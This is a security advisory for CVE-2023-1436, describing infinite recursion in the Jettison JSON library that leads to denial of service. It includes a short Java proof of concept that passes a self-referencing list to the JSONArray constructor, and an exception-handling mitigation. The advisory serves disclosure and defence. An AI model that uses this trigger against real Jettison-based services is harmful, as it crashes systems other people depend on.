---
description: CVE-2023-1436 Medium severity. Infinite recursion in Jettison leads to denial of service when creating a crafted JSONArray
title: Jettison JSONArray DoS
date_published: "2023-03-16"
last_updated: "2023-03-16"
xray_id: XRAY-427911
vul_id: CVE-2023-1436
cvss: 5.9
severity: medium
discovered_by: Nitay Meiron
type: vulnerability

---

## Summary

Infinite recursion in Jettison leads to denial of service when creating a crafted JSONArray

## Component

org.codehaus.jettison:jettison

## Affected versions

(,1.5.4)

## Description

An infinite recursion is triggered in Jettison when constructing a JSONArray from a Collection that contains a self-reference in one of its elements. This leads to a StackOverflowError exception being thrown.

## PoC

```java
public class POC {
    public static void main(String[] args) throws JSONException {
        ArrayList<Object> list = new ArrayList<>();
        list.add(list);
        JSONArray jsonArray = new JSONArray(list);
    }
}
```



## Vulnerability Mitigations

Wrap Jettison's `JSONArray` constructor with exception handling -
```java
try {
	JSONArray jsonArray = new JSONArray(list);
}
catch(StackOverflowError e) {
	System.err.println("ERROR: Stack limit reached");
}
```



## References

No references are supplied for this issue

